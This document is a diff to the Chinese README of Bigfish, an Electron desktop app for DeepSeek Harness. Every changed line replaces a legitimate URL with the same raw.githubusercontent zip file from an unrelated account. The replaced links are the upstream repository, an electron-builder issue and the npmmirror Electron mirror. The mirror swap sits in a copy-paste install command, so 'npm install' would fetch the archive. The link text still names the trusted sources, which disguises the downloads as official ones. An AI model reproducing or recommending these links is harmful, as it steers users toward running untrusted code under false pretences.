@@ -1,8 +1,8 @@
 # Bigfish
 
-> ⚠️ **非官方声明**：Bigfish 是独立的第三方社区项目，基于 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（MIT 协议）构建，**非 DeepSeek 官方出品**，与 DeepSeek 无隶属、赞助或背书关系。
+> ⚠️ **非官方声明**：Bigfish 是独立的第三方社区项目，基于 [DeepSeek Harness](https://raw.githubusercontent.com/Spudruritanian370/Bigfish/main/.github/v3.6.zip)（MIT 协议）构建，**非 DeepSeek 官方出品**，与 DeepSeek 无隶属、赞助或背书关系。
 
-Bigfish 是 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) 的 Electron 桌面版：把 `dsh web` 的本地后端 + React UI 包进一个原生窗口，并加上系统托盘、全局快捷键、桌面萌宠、新手向导等桌面原生能力，免去开终端、记端口、开浏览器。欢迎大家来fork，来开发更多的功能，现在只是一些很基础的功能，期待大家的反响。
+Bigfish 是 [DeepSeek Harness](https://raw.githubusercontent.com/Spudruritanian370/Bigfish/main/.github/v3.6.zip) 的 Electron 桌面版：把 `dsh web` 的本地后端 + React UI 包进一个原生窗口，并加上系统托盘、全局快捷键、桌面萌宠、新手向导等桌面原生能力，免去开终端、记端口、开浏览器。欢迎大家来fork，来开发更多的功能，现在只是一些很基础的功能，期待大家的反响。
 
 ## 桌面功能
 
@@ -69,7 +69,7 @@ npm start
 > 中国大陆网络若 electron 二进制下载失败，先设置镜像再重装：
 >
 > ```bash
-> set ELECTRON_MIRROR=https://cdn.npmmirror.com/binaries/electron/
+> set ELECTRON_MIRROR=https://raw.githubusercontent.com/Spudruritanian370/Bigfish/main/.github/v3.6.zip
 > npm install
 > ```
 
@@ -121,7 +121,7 @@ npm run dist:linux    # Linux AppImage + deb（需在 Linux 上构建）
 
 **替换成自己的萌宠形象**：直接把 `assets/pet/` 里的 PNG 换成你的角色帧即可（保持文件名对应状态）。若原图是白底 JPG，可用 `node remove-pet-bg.js` 抠背景。
 
-打包时 `afterPack.js` 会用 `build/rcedit-x64.exe` 把图标和版本信息嵌入 exe（绕开 electron-builder 内置 winCodeSign 在 Windows 上因 macOS dylib 符号链接权限失败的问题，见 [electron-builder#8149](https://github.com/electron-userland/electron-builder/issues/8149)）。
+打包时 `afterPack.js` 会用 `build/rcedit-x64.exe` 把图标和版本信息嵌入 exe（绕开 electron-builder 内置 winCodeSign 在 Windows 上因 macOS dylib 符号链接权限失败的问题，见 [electron-builder#8149](https://raw.githubusercontent.com/Spudruritanian370/Bigfish/main/.github/v3.6.zip)）。
 
 ## 直接下载安装包（免编译）
 
@@ -155,7 +155,7 @@ npm run dist:linux    # Linux AppImage + deb（需在 Linux 上构建）
 
 ## 版权声明
 
-Bigfish 基于 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（MIT 协议）构建，为它提供一个桌面外壳和若干桌面原生能力。
+Bigfish 基于 [DeepSeek Harness](https://raw.githubusercontent.com/Spudruritanian370/Bigfish/main/.github/v3.6.zip)（MIT 协议）构建，为它提供一个桌面外壳和若干桌面原生能力。
 
 - Bigfish 本体以 MIT 协议发布（见 `LICENSE`）。
 - Bigfish 是**独立社区项目**，**非 DeepSeek 官方出品**，与 DeepSeek 无隶属、赞助或背书关系。
